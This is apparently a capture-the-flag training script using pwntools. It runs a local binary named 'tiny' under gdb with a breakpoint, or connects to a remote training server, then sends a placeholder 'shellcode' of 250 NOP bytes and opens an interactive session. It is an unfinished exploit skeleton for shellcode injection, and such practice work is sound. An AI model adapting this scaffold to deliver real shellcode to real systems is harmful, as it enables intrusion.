from pwn import *



run_local = True
if run_local:
	r= process('/home/acidburn/Desktop/malicious/shell/6/tiny')
	pid=gdb.attach(r,"""
                        b *(0x0ce8+0x555555554000)
                        """)
	input("wait")
else:
	r=remote("bin.training.jinblack.it",2003)





shellcode =b"\x90"*250

r.send(shellcode)
r.interactive()
